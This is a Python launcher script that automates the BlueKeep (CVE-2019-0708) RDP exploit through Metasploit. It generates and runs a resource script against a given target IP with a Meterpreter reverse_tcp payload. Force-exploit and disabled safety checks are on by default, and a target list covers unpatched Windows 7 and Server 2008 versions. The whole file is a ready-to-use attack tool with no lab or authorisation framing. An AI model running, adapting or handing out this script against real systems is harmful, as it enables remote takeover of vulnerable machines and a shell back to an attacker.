#!/usr/bin/env python3

import os
import sys
import argparse
import subprocess
import time
import random
import string

def generate_rc_script(target_ip, target_port, payload="windows/x64/meterpreter/reverse_tcp", 
                      lhost="127.0.0.1", lport=4444, target_id=2, force_exploit=False):
    """Generate a Metasploit resource script for BlueKeep exploitation."""
    script_name = f"bluekeep_msf_{random.randint(1000, 9999)}.rc"
    
    with open(script_name, "w") as f:
        f.write(f"use exploit/windows/rdp/cve_2019_0708_bluekeep_rce\n")
        f.write(f"set RHOSTS {target_ip}\n")
        f.write(f"set RPORT {target_port}\n")
        f.write(f"set TARGET {target_id}\n")
        f.write(f"set PAYLOAD {payload}\n")
        f.write(f"set LHOST {lhost}\n")
        f.write(f"set LPORT {lport}\n")
        
        # Add force exploit option if requested
        if force_exploit:
            f.write(f"set ForceExploit true\n")
            f.write(f"set AutoCheck false\n")
        
        f.write(f"exploit\n")
    
    print(f"[+] Created Metasploit resource script: {script_name}")
    return script_name

def run_metasploit(script_name, verbose=False):
    """Run Metasploit with the generated resource script."""
    print("[*] Launching Metasploit Framework...")
    
    # Always run in foreground mode to see live output
    cmd = ["msfconsole", "-q", "-r", script_name]
    
    try:
        print("[*] Executing command: " + " ".join(cmd))
        print("[*] This may take several minutes. Please be patient...")
        print("[*] If there's no response, check your connectivity to the target")
        print("[*] Press Ctrl+C to cancel at any time\n")
        
        # Always run in foreground to see output
        subprocess.run(cmd)
        return True
    except FileNotFoundError:
        print("[-] Error: Metasploit Framework (msfconsole) not found.")
        print("[*] Please install Metasploit Framework first:")
        print("    sudo apt update && sudo apt install metasploit-framework")
        return False
    except Exception as e:
        print(f"[-] Error running Metasploit: {e}")
        return False

def check_metasploit_installed():
    """Check if Metasploit is installed on the system."""
    try:
        result = subprocess.run(
            ["which", "msfconsole"], 
            stdout=subprocess.PIPE, 
            stderr=subprocess.PIPE,
            text=True
        )
        return result.returncode == 0
    except:
        return False

def parse_arguments():
    parser = argparse.ArgumentParser(description="BlueKeep Exploit - Metasploit Runner")
    parser.add_argument("-i", "--rhost", required=True, help="Target IP address")
    parser.add_argument("-p", "--rport", type=int, default=3389, help="Target RDP port (default: 3389)")
    parser.add_argument("-l", "--lhost", required=False, help="Local host for reverse connection (default: auto-detect)")
    parser.add_argument("-o", "--lport", type=int, default=4444, help="Local port for reverse connection (default: 4444)")
    parser.add_argument("-t", "--target", type=int, choices=range(0, 6), default=2, 
                      help="Target ID (0: auto, 1: Win7 SP1, 2: Win7 SP0, 3: Win2008 R2 SP1, 4: Win2008 R2 SP0, 5: Win2008 SP1). Default: 2")
    parser.add_argument("-P", "--payload", default="windows/x64/meterpreter/reverse_tcp", 
                      help="Metasploit payload (default: windows/x64/meterpreter/reverse_tcp)")
    parser.add_argument("-f", "--force", action="store_true", default=True, 
                      help="Force exploitation even if target appears invulnerable (default: True)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Enable verbose output")
    parser.add_argument("-d", "--debug", action="store_true", help="Debug mode: Show extra diagnostic information")
    return parser.parse_args()

def main():
    banner = """
    __  ___     __                      __      _ __   ____  __           __ __                
   /  |/  /__  / /_____ _____________  / /___  (_) /_ / __ )/ /_  _____  / //_/__  ___ ____   
  / /|_/ / _ \/ __/ __ `/ ___/ ___/ / / / __ \/ / __// __  / / / / / _ \/ ,< / _ \/ -_) __/   
 / /  / /  __/ /_/ /_/ (__  |__  ) /_/ / /_/ / / /_ / /_/ / /___/ /  __/ /| /  __/\__/_/      
/_/  /_/\___/\__/\__,_/____/____/\__,_/ .___/_/\__//_____/_____/_/\___/_/ |_\___/             
                                     /_/                                                      
                                                        
 CVE-2019-0708 BlueKeep Exploit - Metasploit Version
 Target: Windows 2003/XP/Vista/7/Server 2008
 """
    
    print(banner)
    
    # Parse arguments
    args = parse_arguments()
    
    # Check if Metasploit is installed
    if not check_metasploit_installed():
        print("[-] Error: Metasploit Framework (msfconsole) not found.")
        print("[*] Please install Metasploit Framework first:")
        print("    sudo apt update && sudo apt install metasploit-framework")
        sys.exit(1)
    
    # Debug information about environment
    if args.debug:
        print("[DEBUG] System information:")
        try:
            subprocess.run(["uname", "-a"], check=True)
            print("[DEBUG] Network interfaces:")
            subprocess.run(["ip", "addr"], check=True)
            print("[DEBUG] Checking connection to target:")
            subprocess.run(["ping", "-c", "3", args.rhost], check=False)
            print("[DEBUG] Checking if target port is open:")
            subprocess.run(["nc", "-zv", args.rhost, str(args.rport)], check=False)
        except Exception as e:
            print(f"[DEBUG] Error during diagnostics: {e}")
    
    # Auto-detect local IP if not provided
    lhost = args.lhost
    if not lhost:
        try:
            # This creates a socket and connects to an external address to determine local IP
            s = subprocess.run(['hostname', '-I'], stdout=subprocess.PIPE, text=True)
            lhost = s.stdout.strip().split()[0]
            print(f"[*] Auto-detected local IP: {lhost}")
        except:
            print("[-] Failed to auto-detect local IP. Please specify with -l/--lhost")
            sys.exit(1)
    
    # Display configuration
    print(f"[*] Target: {args.rhost}:{args.rport}")
    print(f"[*] Local handler: {lhost}:{args.lport}")
    print(f"[*] Payload: {args.payload}")
    print(f"[*] Target ID: {args.target}")
    print(f"[*] Force Exploit: {'Yes' if args.force else 'No'}")
    
    # Map target ID to descriptive name
    target_names = {
        0: "Automatic targeting",
        1: "Windows 7 SP1 (6.1.7601 x64)",
        2: "Windows 7 SP0 (6.1.7600 x64) [RECOMMENDED]",
        3: "Windows Server 2008 R2 SP1 (6.1.7601 x64)",
        4: "Windows Server 2008 R2 SP0 (6.1.7600 x64)",
        5: "Windows Server 2008 SP1 (6.0.6001 x64)"
    }
    print(f"[*] Target OS: {target_names.get(args.target, 'Unknown')}")
    
    # Warning for Server 2008 targets
    if args.target in [3, 4, 5]:
        print("[!] WARNING: Windows Server 2008 targets require fDisableCam=0 registry setting!")
    
    print()
    
    try:
        # Generate the resource script
        script_name = generate_rc_script(args.rhost, args.rport, args.payload, lhost, args.lport, args.target, args.force)
        
        # Add verbose option to show script content
        if args.verbose:
            print("[*] Resource script content:")
            with open(script_name, "r") as f:
                print(f.read())
            
            # Ask if the user wants to run immediately or manually
            if input("\nRun Metasploit now? (y/n): ").lower() != 'y':
                print(f"\n[*] Resource script created: {script_name}")
                print(f"[*] You can run it manually with: msfconsole -r {script_name}")
                return
        
        # Run Metasploit
        print("[*] Starting Metasploit exploitation...")
        success = run_metasploit(script_name, args.verbose)
        
        # Clean up the resource script
        if os.path.exists(script_name) and not args.verbose:
            os.remove(script_name)
            print(f"[+] Removed temporary resource script: {script_name}")
        
        if success:
            print("\n[+] Metasploit execution completed.")
        else:
            print("\n[-] Metasploit execution failed.")
            
    except KeyboardInterrupt:
        print("\n[!] Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] An unexpected error occurred: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    main()
